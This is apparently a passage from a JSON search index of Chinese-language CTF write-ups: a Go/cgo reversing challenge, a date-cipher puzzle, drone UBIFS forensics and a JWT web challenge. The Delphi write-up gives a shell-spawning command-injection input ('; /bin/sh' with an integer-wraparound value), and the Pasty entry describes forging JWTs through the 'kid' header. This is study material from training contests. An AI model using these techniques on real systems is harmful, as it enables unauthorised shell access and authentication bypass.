abc\n;\n/bin/sh \n65498\n              \n# 2^16 - 42 + 4 (eax = 4)\n\nabc\n$ ls\ndelphi  libtwenty.so  peda-session-delphi.txt\n$", 
            "title": "Delphi"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#delphi", 
            "text": "Challenge link: Nope  Category: reverse  Writeup:  Delphi   delphi  libtwenty.so", 
            "title": "Delphi"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#observation", 
            "text": "\u56e0\u70ba\u6709\u984d\u5916\u7d66\u7684 Library \uff0c\u6240\u4ee5\u8981\u57f7\u884c(\u5206\u6790)\u7684\u6642\u5019\u8981\u642d\u914d  LD_LIBRARY_PATH=.  \u5c07\u7576\u524d\u8cc7\u6599\u593e\u6307\u5b9a\u7d66 Library \u8def\u5f91  $  LD_LIBRARY_PATH = . ./delphi \nWelcome!\n\nAre you ready to play  20  questions? No? Perfect!\nI m thinking of something big, metal, and orange. Go!   test  Who s that?  deadbeef\nWho s that?", 
            "title": "Observation"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#file", 
            "text": "$ file ./delphi \n./delphi: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 70886b932f383987896e371d422ab8a4089bd148, not stripped", 
            "title": "file"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#go-binary", 
            "text": "Objdump \u5f8c\u767c\u73fe  main.main  \uff0c\u662f go \u7684 binary \u6a94\uff0c\u5176\u4e2d\u5728 main package \u4e2d\u6709\u5169\u500b\u6bd4\u8f03\u7279\u5225\u7684 function   main.doTheMagic  main._Cfunc_check_answer (cgo \u7684 function)   $ objdump -d delphi  |  grep  .*main.* : \n0000000000400df0  __libc_start_main@plt : 0000000000401280   main.main :\n0000000000401c30  main.doTheMagic :\n0000000000401df0  main.init :\n00000000004021c0  main._Cfunc_CString : 0000000000402230   main._Cfunc_check_answer : 0000000000402270   main._Cfunc_free :\n0000000000411b20  runtime.main :\n00000000004295b0  main :", 
            "title": "go binary"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#input", 
            "text": "\u4e00\u958b\u59cb\u5148\u627e\u770b\u770b\u8f38\u5165\u7684\u5730\u65b9  $ go tool objdump delphi  |  grep  .*main\\.go.*Scan \n        main.go:34      0x4016ee        bd30b74f00                      MOVL  $bufio .ScanLines.f ( SB ) , BP\n        main.go:35      0x401755        e816b80200                      CALL bufio. ( *Scanner ) .Scan ( SB )      0x401747  main.main+1223 :   mov    QWORD PTR  [ rsp+0x48 ] ,rax\n   0x40174c  main.main+1228 :   mov    rbx,QWORD PTR  [ rsp+0x48 ] \n   0x401751  main.main+1233 :   mov    QWORD PTR  [ rsp ] ,rbx =  0x401755  main.main+1237 :   call   0x42cf70  bufio. ( *Scanner ) .Scan \n   0x40175a  main.main+1242 :   movzx  rbx,BYTE PTR  [ rsp+0x8 ] \n   0x401760  main.main+1248 :   cmp    bl,0x0\n   0x401763  main.main+1251 :   je     0x4018b1  main.main+1585 \n   0x401769  main.main+1257 :   mov    rdi,QWORD PTR  [ rsp+0x48 ] \nGuessed arguments:\narg [ 0 ] : 0xc208028130 --  0x0 \narg [ 1 ] : 0x7ffff7e20df0 --  0xc208020000 --  0x0   \u8f38\u5165 deadbeef \u5f8c\u7e7c\u7e8c\u89c0\u5bdf  \u767c\u73fe\u5f8c\u9762\u51fa\u73fe\u4e00\u6bb5\u6709\u8da3\u7684\u6bd4\u8f03\uff0c\u6b64\u6642\u7684  rdx  \u662f\u8f38\u5165\u7684\u9577\u5ea6\uff0c rax  \u662f 'go' \u7684\u9577\u5ea6  \u7531\u5e95\u4e0b  jl  \u548c  jb  \u53ef\u77e5  \u8f38\u5165\u4e0d\u80fd\u5c0f\u65bc 2   RAX: 0x2 \nRBX: 0x4d7f60 --  0x4d7f70 --  0x6f67  ( go ) \nRCX: 0x66656562  ( beef ) \nRDX: 0x8 \nRSI: 0x4d7f70 --  0x6f67  ( go ) \nRDI: 0xc208000260  ( deadbeef ) \nRBP: 0x7ffff7fb3000 --  0x781d28  ( 0x00007ffff7fb3000 ) \nRSP: 0x7ffff7e20dc0 --  0xc208013000  ( deadbeef\\n )  [ -------------------------------------code------------------------------------- ] \n   0x401939  main.main+1721 :   mov    rax,QWORD PTR  [ rbx+0x8 ] \n   0x40193d  main.main+1725 :   mov    QWORD PTR  [ rsp+0x90 ] ,rdx\n   0x401945  main.main+1733 :   mov    QWORD PTR  [ rsp+0xb0 ] ,rax =  0x40194d  main.main+1741 :   cmp    rdx,rax\n   0x401950  main.main+1744 :   jl     0x401baa  main.main+2346 \n   0x401956  main.main+1750 :   cmp    rdx,rax\n   0x401959  main.main+1753 :   jb     0x401bb2  main.main+2354 \n   0x40195f  main.main+1759 :   mov    QWORD PTR  [ rsp+0xb8 ] ,rdi  \u518d\u5f80\u4e0b\u770b\uff0c\u51fa\u73fe\u4e86  runtime.eqstring    \u6bd4\u8f03\u7684\u76ee\u6a19\u662f \u8f38\u5165 ( 'deadbeef' ) \u4ee5\u53ca 'go' \u7684\u524d\u5169\u500b byte (0x2)     0x401986  main.main+1798 :   mov    QWORD PTR  [ rsp+0x18 ] ,rax =  0x40198b  main.main+1803 :   call   0x425600  runtime.eqstring \n   0x401990  main.main+1808 :   movzx  rbx,BYTE PTR  [ rsp+0x20 ]  [ ------------------------------------stack------------------------------------- ]  0000 |  0x7ffff7e20dc0 --  0xc208000260  ( deadbeef )  0008 |  0x7ffff7e20dc8 --  0x2  0016 |  0x7ffff7e20dd0 --  0x4d7f70 --  0x6f67  ( go )  0024 |  0x7ffff7e20dd8 --  0x2  \u5be6\u969b\u6e2c\u8a66\u4e00\u4e0b\uff0c\u679c\u7136\u8f38\u5165\u958b\u982d\u662f go \u7684\u8a71\u5c31\u6703\u51fa\u73fe\u4e0d\u4e00\u6a23\u7684\u7d50\u679c  LD_LIBRARY_PATH = . ./delphi \nWelcome!\n\nAre you ready to play  20  questions? No? Perfect!\nI m thinking of something big, metal, and orange. Go!   goabcd  Sneaky, sneaky. Go where? How fast?   go  Sneaky, sneaky. Go where? How fast?   abcd  Who s that?    \u6bd4\u5c0d\u6b63\u78ba\u5f8c\u5c31\u6703\u9032\u5165  main.doTheMagic  \u4e86     0x401a0d  main.main+1933 :   mov    QWORD PTR  [ rsp+0x8 ] ,rax =  0x401a12  main.main+1938 :   call   0x401c30  main.doTheMagic \n   0x401a17  main.main+1943 :   lea    rbx,ds:0x4d4060", 
            "title": "Input"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#dothemagic", 
            "text": "\u7e7c\u7e8c\u5f80\u4e0b\u770b\uff0c\u767c\u73fe  strings.Split  \uff0c\u4ee5\u7a7a\u683c( ' ' )\u4f5c\u70ba\u5207\u5272\u9ede  \u7e7c\u7e8c\u57f7\u884c\u5f8c\u5c31\u7d50\u675f\u4e86     0x401c77  main.doTheMagic+71 :       mov    rdi,rbp\n   0x401c7a  main.doTheMagic+74 :       movs   QWORD PTR es: [ rdi ] ,QWORD PTR ds: [ rsi ] \n   0x401c7c  main.doTheMagic+76 :       movs   QWORD PTR es: [ rdi ] ,QWORD PTR ds: [ rsi ]  =  0x401c7e  main.doTheMagic+78 :       call   0x44a480  strings.Split \n   0x401c83  main.doTheMagic+83 :       mov    rdx,QWORD PTR  [ rsp+0x20 ] \n   0x401c88  main.doTheMagic+88 :       mov    rax,QWORD PTR  [ rsp+0x28 ] \n   0x401c8d  main.doTheMagic+93 :       mov    rcx,QWORD PTR  [ rsp+0x30 ] \n   0x401c92  main.doTheMagic+98 :       mov    QWORD PTR  [ rsp+0x68 ] ,rdx\nGuessed arguments:\narg [ 0 ] : 0x7ffff7e20d40 --  0x8 \narg [ 1 ] : 0x4d37d0 --  0x20  (   )   \u53e6\u5916\u5728\u5f8c\u9762\u53ef\u4ee5\u627e\u5230  main._Cfunc_check_answer  401dbf:       e8 6c  04   00   00           callq   402230   main._Cfunc_check_answer   \u6211\u731c\u53ef\u80fd\u8f38\u5165\u8981\u7528\u7a7a\u683c\u5206\u6210\u597d\u5e7e\u6bb5\uff0c\u56e0\u6b64\u6211\u5728  main._Cfunc_check_answer  \u8a2d\u65b7\u9ede\uff0c\u4e26\u586b\u5165\u4e0d\u540c\u6578\u76ee\u7684\u8f38\u5165\u6e2c\u8a66\uff0c\u6700\u5f8c\u767c\u73fe\u9700\u8981\u8f38\u5165\u5171\u4e09\u6bb5\u5c31\u6703\u7d93\u904e\u65b7\u9ede\uff0c\u8f38\u5165\u683c\u5f0f\u5982\u4e0b  go  something   something", 
            "title": "doTheMagic"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#check_answer", 
            "text": "\u5f80\u4e0b\u770b\u767c\u73fe\u4ed6\u5229\u7528  cgocall  \u547c\u53eb\u4e86  0x400f80  =  0x402249  main._Cfunc_check_answer+25 :      mov    eax,0x400f80\n   0x40224e  main._Cfunc_check_answer+30 :      mov    QWORD PTR  [ rsp ] ,rax\n   0x402252  main._Cfunc_check_answer+34 :      lea    rax, [ rsp+0x18 ] \n   0x402257  main._Cfunc_check_answer+39 :      mov    QWORD PTR  [ rsp+0x8 ] ,rax\n   0x40225c  main._Cfunc_check_answer+44 :      call   0x404da0  runtime.cgocall   gdb-peda$ x/5gi 0x400f80\n   0x400f80  _cgo_de3376964270_Cfunc_check_answer :     mov    rsi,QWORD PTR  [ rdi+0x8 ] \n   0x400f84  _cgo_de3376964270_Cfunc_check_answer+4 :   mov    edi,DWORD PTR  [ rdi ] \n   0x400f86  _cgo_de3376964270_Cfunc_check_answer+6 :   jmp    0x400de0  check_answer@plt \n   0x400f8b:    nop    DWORD PTR  [ rax+rax*1+0x0 ] \n   0x400f90  _cgo_de3376964270_Cfunc_free :     mov    rdi,QWORD PTR  [ rdi ]   \u8981\u8ffd\u9032\u53bb\u7684\u8a71\uff0c\u5efa\u8b70\u662f\u5728  0x400f80  \u8a2d\u65b7\u9ede\uff0c\u63a5\u8457 continue \u904e\u53bb\uff0c\u907f\u514d\u4e2d\u9014\u6c92\u8ddf\u5230  \u6700\u5f8c\u6703\u56de\u5230 check_answer  =  0x7ffff7bd5758  check_answer :       push   rbp\n   0x7ffff7bd5759  check_answer+1 :     mov    rbp,rsp\n   0x7ffff7bd575c  check_answer+4 :     sub    rsp,0xa0\n   0x7ffff7bd5763  check_answer+11 :    mov    DWORD PTR  [ rbp-0x94 ] ,edi\n   0x7ffff7bd5769  check_answer+17 :    mov    QWORD PTR  [ rbp-0xa0 ] ,rsi  \u5f80\u4e0b\u8ffd\u6703\u51fa\u73fe\u4e00\u500b\u6709\u8da3\u7684\u6771\u897f  \u6b64\u6642\u7684  eax  \u662f\u6700\u5f8c\u4e00\u6bb5\u8f38\u5165\u7684\u503c\uff0c\u56e0\u70ba\u6211\u8f38\u5165\u7684\u662f  go abc def  \uff0c\u6240\u4ee5\u9019\u908a\u7684 eax \u56e0\u7232\u8f49\u4e0d\u51fa\u4f86\u6240\u4ee5\u8b8a\u6210 0  add \u5f8c\u8b8a\u6210 42\uff0c\u7531\u6b64\u53ef\u77e5 [rbp-0x2] \u539f\u59cb\u503c\u61c9\u8a72\u662f 42     0x7ffff7bd5789  check_answer+49 :    mov    eax,DWORD PTR  [ rbp-0x94 ]  =  0x7ffff7bd578f  check_answer+55 :    add    WORD PTR  [ rbp-0x2 ] ,ax\n   0x7ffff7bd5793  check_answer+59 :    movzx  eax,WORD PTR  [ rbp-0x2 ] \n   0x7ffff7bd5797  check_answer+63 :    cmp    eax,0x4\n   0x7ffff7bd579a  check_answer+66 :    ja     0x7ffff7bd57ed  check_answer+149   \u5982\u679c\u6bd4\u8f03\u7b26\u5408\u5f8c\u8df3\u904e\u53bb\uff0c\u6703\u51fa\u73fe  strcat  \u4ee5\u53ca  system    \u5728 stack \u4e2d\u53ef\u4ee5\u770b\u5230 \u2019echo' \u4ee5\u53ca\u7b2c\u4e8c\u6bb5\u8f38\u5165 'abc' \uff0c\u770b\u4f86\u662f\u5408\u6210 'echo abc' \u4ee5\u5f8c\u5229\u7528 system \u57f7\u884c  =  0x7ffff7bd57d7  check_answer+127 :   call   0x7ffff7bd5650  strcat@plt \n   0x7ffff7bd57dc  check_answer+132 :   lea    rax, [ rbp-0x90 ] \n   0x7ffff7bd57e3  check_answer+139 :   mov    rdi,rax\n   0x7ffff7bd57e6  check_answer+142 :   call   0x7ffff7bd5630  system@plt  [ ------------------------------------stack------------------------------------- ]  0000 |  0x7fffffffe4f0 --  0x788170 --  0x636261  ( abc )  0008 |  0x7fffffffe4f8 --  0x0  0016 |  0x7fffffffe500 --  0x206f686365  ( echo  )   \u7d9c\u5408\u4e0a\u8ff0\uff0c\u6211\u5011\u61c9\u8a72\u8981\u4f7f 42 + {number}  = 4  \u9019\u88e1\u6709\u500b\u6709\u8da3\u7684\u5730\u65b9\uff0c\u4ed6\u5728\u53d6\u503c\u7684\u6642\u5019\u662f\u4f7f\u7528 WORD (2 bytes) \u4f86\u53d6\uff0c\u7576\u9019\u88e1\u7684\u503c\u8d85\u904e WORD \u4e0a\u9650\u6642\u5c31\u6703\u6b78\u96f6\uff0c\u6211\u5011\u53ef\u4ee5\u5229\u7528\u9019\u500b\u9ede\u4f86\u9054\u6210\u4e0a\u8ff0\u7684\u689d\u4ef6  number = 2^16 - 42 + eax", 
            "title": "check_answer"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/#command-injection", 
            "text": "\u524d\u9762\u6709\u770b\u5230\u7d44\u5408\u7684 'echo abc' \uff0c\u6b64\u6642\u53ef\u4ee5\u5229\u7528  ;  \u4f86\u9032\u884c command injection \u4f86\u62ff\u5230 shell  $  LD_LIBRARY_PATH = . ./delphi \nWelcome!\n\nAre you ready to play  20  questions? No? Perfect!\nI m thinking of something big, metal, and orange. Go!  go abc ; /bin/sh  65498                # 2^16 - 42 + 4 (eax = 4) \nabc\n$ ls\ndelphi  libtwenty.so  peda-session-delphi.txt\n$", 
            "title": "command injection"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/", 
            "text": "2017, Dating in Singapore\n\n\n\n\nChallenge Link: \n2017, Dating in Singapore\n\n\nCategory: MISC\n\n\nWriteup: \n2017, Dating in Singapore\n\n\n\n\n01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625\n\n\n\u5206\u6790\u5b57\u4e32\n\n\n\n\n\u7528 - \u5206\u9694\u7684\u8a71\u5171\u670912\u6bb5\n\n\n\u6bcf\u6bb5\u7684\u9577\u5ea6\u4e0d\u4e00\u6a23\uff0c\u4f46\u90fd\u662f\u96d9\u6578\n\n\n\n\n\u5617\u8a66\n\n\n\n\n\u6bcf\u5169\u500b\u4e00\u7d44\u8f49\u6210ascii -\n \u6c92\u610f\u601d\n\n\n\u8f49\u6210hex -\n \u6c92\u610f\u601d\n\n\n\n\n\u89e3\u6cd5\n\n\n\n\n\u89c0\u5bdf\u6a19\u984c \u201c2017, Dating in Singapore\u201d -\n \u53ef\u80fd\u8ddf\u65e5\u671f\u6709\u95dc\n\n\n\u767c\u73fe\u6bcf\u5169\u500b\u4e00\u7d44\u90fd\u4e0d\u6703\u8d85\u904e31\uff0c\u53c8\u5171\u670912\u500b\u6708\n\n\n\u627e\u5230\u65b0\u52a0\u57612017\u7684\u6708\u66c6\u5f8c\u5c07\u5c0d\u61c9\u7684\u65e5\u671f\u6a19\u8a18\u51fa\u4f86", 
            "title": "2017, Dating in Singapore"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/#2017-dating-in-singapore", 
            "text": "Challenge Link:  2017, Dating in Singapore  Category: MISC  Writeup:  2017, Dating in Singapore   01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625", 
            "title": "2017, Dating in Singapore"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/#_1", 
            "text": "\u7528 - \u5206\u9694\u7684\u8a71\u5171\u670912\u6bb5  \u6bcf\u6bb5\u7684\u9577\u5ea6\u4e0d\u4e00\u6a23\uff0c\u4f46\u90fd\u662f\u96d9\u6578", 
            "title": "\u5206\u6790\u5b57\u4e32"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/#_2", 
            "text": "\u6bcf\u5169\u500b\u4e00\u7d44\u8f49\u6210ascii -  \u6c92\u610f\u601d  \u8f49\u6210hex -  \u6c92\u610f\u601d", 
            "title": "\u5617\u8a66"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/#_3", 
            "text": "\u89c0\u5bdf\u6a19\u984c \u201c2017, Dating in Singapore\u201d -  \u53ef\u80fd\u8ddf\u65e5\u671f\u6709\u95dc  \u767c\u73fe\u6bcf\u5169\u500b\u4e00\u7d44\u90fd\u4e0d\u6703\u8d85\u904e31\uff0c\u53c8\u5171\u670912\u500b\u6708  \u627e\u5230\u65b0\u52a0\u57612017\u7684\u6708\u66c6\u5f8c\u5c07\u5c0d\u61c9\u7684\u65e5\u671f\u6a19\u8a18\u51fa\u4f86", 
            "title": "\u89e3\u6cd5"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Flying_High/", 
            "text": "Flying_High\n\n\n\n\nChallenge Link: \nFlying_High\n\n\nCategory: MISC\n\n\nWriteup: \nFlying_High\n\n\n\n\nWe found a crashed drone, are you able to recover information what this drone was doing?\n\nFlying_High.tar.gz\n:43ce56686b4f38b68108140825434f76bfed47530a92f3a6469c202746c257f2\n\n\n\u5206\u6790\n\n\n\u9644\u4ef6\u6253\u958b\u5f8c\u6709\u56db\u500bbinanry\u6a94\n\n\nimage0.bin\nimage1.bin\nimage2.bin\nimage3.bin\n\n\n\n\n\u7528binwalk\u767c\u73fe\u88e1\u9762\u6709\u5f88\u591a\u6a94\u6848\n\n\nDECIMAL HEXADECIMAL DESCRIPTION\n0 0x0 UBIFS filesystem superblock node, CRC: 0x3A905A7, flags: 0x0, min I/O unit size: 2048, erase block size: 126976, erase block count: 58, max erase blocks: 58, format version: 4, compression type: none\n\u2026\n262144 0x40000 UBIFS filesystem master node, CRC: 0x40782ADA, highest inode: 72, commit number: 61\n264192 0x40800 UBIFS filesystem master node, CRC: 0x6D072259, highest inode: 72, commit number: 62\n266240 0x41000 UBIFS filesystem master node, CRC: 0x13DCBFF9, highest inode: 72, commit number: 63\n268288 0x41800 UBIFS filesystem master node, CRC: 0x1EDB0C74, highest inode: 73, commit number: 64\n270336 0x42000 UBIFS filesystem master node, CRC: 0x5E9D0073, highest inode: 73, commit number: 65\n272384 0x42800 UBIFS filesystem master node, CRC: 0xFF510C2, highest inode: 74, commit number: 66\n274432 0x43000 UBIFS filesystem master node, CRC: 0xB70FE71F, highest inode: 74, commit number: 67\n1525808 0x174830 XML document, version: \n1.0\n\n1527856 0x175030 XML document, version: \n1.0\n\n1529904 0x175830 XML document, version: \n1.0\n\n1531952 0x176030 XML document, version: \n1.0\n\n1534000 0x176830 XML document, version: \n1.0\n\n1536048 0x177030 XML document, version: \n1.0\n\n1538168 0x177878 XML document, version: \n1.0\n\n1540144 0x178030 XML document, version: \n1.0\n\n1542192 0x178830 XML document, version: \n1.0\n\n1544240 0x179030 XML document, version: \n1.0\n\n1546288 0x179830 XML document, version: \n1.0\n\n1548336 0x17A030 XML document, version: \n1.0\n\n1550384 0x17A830 XML document, version: \n1.0\n\n1552432 0x17B030 XML document, version: \n1.0\n\n1554480 0x17B830 XML document, version: \n1.0\n\n1556528 0x17C030 XML document, version: \n1.0\n\n1558576 0x17C830 XML document, version: \n1.0\n\n1560624 0x17D030 Zip archive data, at least v2.0 to extract, compressed size: 3725, uncompressed size: 23763, name: FVT1_MB\\FVT1_MB.xml\n1564398 0x17DEEE Zip archive data, at least v2.0 to extract, compressed size: 1414, uncompressed size: 5298, name: FVT1_MB\\SETTINGS\\SETTINGS_FVT1_MB_TESTER_1.xml\n1565936 0x17E4F0 Zip archive data, at least v2.0 to extract, compressed size: 433, uncompressed size: 1440, name: FVT1_MB\\TRACE.xml\n1566416 0x17E6D0 Zip archive data, at least v2.0 to extract, compressed size: 1340, uncompressed size: 20339, name: HMI_1_TESTER.xml\n1567802 0x17EC3A Zip archive data, at least v2.0 to extract, compressed size: 304, uncompressed size: 815, name: MAIN.xml\n\u2026\n\n\n\n\n\u5617\u8a66\n\n\n\u6bcf\u500bbinanry\u90fddump\u51fa\u4f86\u770b\u770b\uff0c\u5167\u542b\u591a\u500bxml\u6a94\n- \u7a0d\u5fae\u770b\u4e86\u4e0b\uff0c\u4e0d\u592a\u660e\u767d\u5167\u5bb9\u662f\u5565\n- \u7528strings\u6383\u904e\uff0c\u6c92\u627e\u5230hitb, flag\u4e4b\u985e\u7684\u5b57\u773c\n\n\n\u89e3\u6cd5\n\n\n\n\n\n\n\u7528\nfile\n\u78ba\u5b9a\u6a94\u6848\u578b\u5225 -\n \u767c\u73feUBIfs\n\n% file image0.bin\nimage0.bin: UBIfs image, sequence number 1, length 4096, CRC 0x03a905a7\n\n\n\n\n\n\n\n\u5229\u7528\nubireader\n\u62c9\u51fa\u5b8c\u6574\u7684\u76ee\u9304\u7d50\u69cb\n\n\n\n\n\u5728image3.bin\u4e2d\u767c\u73fe\u4e00\u652f\u5f71\u7247", 
            "title": "Flying_High"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Flying_High/#flying_high", 
            "text": "Challenge Link:  Flying_High  Category: MISC  Writeup:  Flying_High   We found a crashed drone, are you able to recover information what this drone was doing? Flying_High.tar.gz :43ce56686b4f38b68108140825434f76bfed47530a92f3a6469c202746c257f2", 
            "title": "Flying_High"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Flying_High/#_1", 
            "text": "\u9644\u4ef6\u6253\u958b\u5f8c\u6709\u56db\u500bbinanry\u6a94  image0.bin\nimage1.bin\nimage2.bin\nimage3.bin  \u7528binwalk\u767c\u73fe\u88e1\u9762\u6709\u5f88\u591a\u6a94\u6848  DECIMAL HEXADECIMAL DESCRIPTION\n0 0x0 UBIFS filesystem superblock node, CRC: 0x3A905A7, flags: 0x0, min I/O unit size: 2048, erase block size: 126976, erase block count: 58, max erase blocks: 58, format version: 4, compression type: none\n\u2026\n262144 0x40000 UBIFS filesystem master node, CRC: 0x40782ADA, highest inode: 72, commit number: 61\n264192 0x40800 UBIFS filesystem master node, CRC: 0x6D072259, highest inode: 72, commit number: 62\n266240 0x41000 UBIFS filesystem master node, CRC: 0x13DCBFF9, highest inode: 72, commit number: 63\n268288 0x41800 UBIFS filesystem master node, CRC: 0x1EDB0C74, highest inode: 73, commit number: 64\n270336 0x42000 UBIFS filesystem master node, CRC: 0x5E9D0073, highest inode: 73, commit number: 65\n272384 0x42800 UBIFS filesystem master node, CRC: 0xFF510C2, highest inode: 74, commit number: 66\n274432 0x43000 UBIFS filesystem master node, CRC: 0xB70FE71F, highest inode: 74, commit number: 67\n1525808 0x174830 XML document, version:  1.0 \n1527856 0x175030 XML document, version:  1.0 \n1529904 0x175830 XML document, version:  1.0 \n1531952 0x176030 XML document, version:  1.0 \n1534000 0x176830 XML document, version:  1.0 \n1536048 0x177030 XML document, version:  1.0 \n1538168 0x177878 XML document, version:  1.0 \n1540144 0x178030 XML document, version:  1.0 \n1542192 0x178830 XML document, version:  1.0 \n1544240 0x179030 XML document, version:  1.0 \n1546288 0x179830 XML document, version:  1.0 \n1548336 0x17A030 XML document, version:  1.0 \n1550384 0x17A830 XML document, version:  1.0 \n1552432 0x17B030 XML document, version:  1.0 \n1554480 0x17B830 XML document, version:  1.0 \n1556528 0x17C030 XML document, version:  1.0 \n1558576 0x17C830 XML document, version:  1.0 \n1560624 0x17D030 Zip archive data, at least v2.0 to extract, compressed size: 3725, uncompressed size: 23763, name: FVT1_MB\\FVT1_MB.xml\n1564398 0x17DEEE Zip archive data, at least v2.0 to extract, compressed size: 1414, uncompressed size: 5298, name: FVT1_MB\\SETTINGS\\SETTINGS_FVT1_MB_TESTER_1.xml\n1565936 0x17E4F0 Zip archive data, at least v2.0 to extract, compressed size: 433, uncompressed size: 1440, name: FVT1_MB\\TRACE.xml\n1566416 0x17E6D0 Zip archive data, at least v2.0 to extract, compressed size: 1340, uncompressed size: 20339, name: HMI_1_TESTER.xml\n1567802 0x17EC3A Zip archive data, at least v2.0 to extract, compressed size: 304, uncompressed size: 815, name: MAIN.xml\n\u2026", 
            "title": "\u5206\u6790"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Flying_High/#_2", 
            "text": "\u6bcf\u500bbinanry\u90fddump\u51fa\u4f86\u770b\u770b\uff0c\u5167\u542b\u591a\u500bxml\u6a94\n- \u7a0d\u5fae\u770b\u4e86\u4e0b\uff0c\u4e0d\u592a\u660e\u767d\u5167\u5bb9\u662f\u5565\n- \u7528strings\u6383\u904e\uff0c\u6c92\u627e\u5230hitb, flag\u4e4b\u985e\u7684\u5b57\u773c", 
            "title": "\u5617\u8a66"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Flying_High/#_3", 
            "text": "\u7528 file \u78ba\u5b9a\u6a94\u6848\u578b\u5225 -  \u767c\u73feUBIfs % file image0.bin\nimage0.bin: UBIfs image, sequence number 1, length 4096, CRC 0x03a905a7    \u5229\u7528 ubireader \u62c9\u51fa\u5b8c\u6574\u7684\u76ee\u9304\u7d50\u69cb   \u5728image3.bin\u4e2d\u767c\u73fe\u4e00\u652f\u5f71\u7247", 
            "title": "\u89e3\u6cd5"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Pasty/", 
            "text": "Pasty\n\n\n\n\nChallenge Link: \nPasty\n\n\nCategory: Web\n\n\nWriteup: \nPasty\n\n\n\n\nCan you find the administrator's secret message?\n\n\n\u5206\u6790\n\n\n\u6b64\u984c\u63d0\u4f9b\u4e00\u500b\u53ef\u4ee5\u7528\u5e33\u5bc6\u767b\u5165\u7684\u8a18\u4e8b\u672c\u7db2\u7ad9\uff0c\u76ee\u6a19\u662f\u53d6\u5f97\u7ba1\u7406\u54e1\u5e33\u5bc6\n- \u767c\u73fe\u767b\u5165\u5f8c\u7528jwt\u4f5c\u70batoken\u4f86\u8a8d\u8b49\n- \u53ea\u8981\u6539\u52d5token\u4e2d\uff0c\u4f7f\u7528\u8005\u7684\u540d\u5b57\u5c31\u53ef\u4ee5\u9054\u6210\u4e86\n\n\n\u5617\u8a66\n\n\n\u4e0a\u7db2\u627ejwt\u7684\u6f0f\u6d1e\u4e4b\u985e\u7684 -\n \u627e\u5230\u7684\u4e0d\u80fd\u7528QQ\n\n\n\u89e3\u6cd5\n\n\njwt\u7684header\u4e2d\u6709\u4e00\u500b\nkid\n\uff0c\u9019\u500b\u4ee3\u8868\u7684\u662f\u516c\u9470\u7684\u4f4d\u5740\n-\n \u53ef\u4ee5\u81ea\u5df1\u7522\u751f\u516c\u79c1\u9470\uff0c\u7528\u79c1\u9470\u52a0\u5bc6\u5f8c\uff0c\u628akid\u6539\u6210\u516c\u9470\u4f4d\u5740\u9001\u56de\u53bb\n\n\n\u4f46\u662f\u516c\u9470\u7684\u4f4d\u5740\u5728\u4f3a\u670d\u5668\u5e95\u4e0b\u7684\u76ee\u9304\uff0c\u6240\u4ee5\u8981\u5148\u628a\u516c\u9470\u8cbc\u5728pasty\u4e0a\uff0c\u63a5\u8457\u53d6\u51fa\u5728\u4f3a\u670d\u5668\u4e0a\u7684\u4f4d\u5740\u8cbc\u9032\u53bb\n\n\n\n\n\u516c\u9470\u6703\u81ea\u52d5\u52a0\u4e0a.pem\u8a72\u5982\u4f55\u8655\u7406\uff1f\n\n\n\u5728\u7db2\u5740\u6700\u5f8c\u9762\u52a0\u4e0a?\uff0c\u8b93.pem\u8b8a\u6210\u53c3\u6578", 
            "title": "Pasty"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Pasty/#pasty", 
            "text": "Challenge Link:  Pasty  Category: Web  Writeup:  Pasty   Can you find the administrator's secret message?", 
            "title": "Pasty"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Pasty/#_1", 
            "text": "\u6b64\u984c\u63d0\u4f9b\u4e00\u500b\u53ef\u4ee5\u7528\u5e33\u5bc6\u767b\u5165\u7684\u8a18\u4e8b\u672c\u7db2\u7ad9\uff0c\u76ee\u6a19\u662f\u53d6\u5f97\u7ba1\u7406\u54e1\u5e33\u5bc6\n- \u767c\u73fe\u767b\u5165\u5f8c\u7528jwt\u4f5c\u70batoken\u4f86\u8a8d\u8b49\n- \u53ea\u8981\u6539\u52d5token\u4e2d\uff0c\u4f7f\u7528\u8005\u7684\u540d\u5b57\u5c31\u53ef\u4ee5\u9054\u6210\u4e86", 
            "title": "\u5206\u6790"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Pasty/#_2", 
            "text": "\u4e0a\u7db2\u627ejwt\u7684\u6f0f\u6d1e\u4e4b\u985e\u7684 -  \u627e\u5230\u7684\u4e0d\u80fd\u7528QQ", 
            "title": "\u5617\u8a66"
        }, 
        {
            "location": "/Writeups/2017/HITB_CTF/Pasty/#_3", 
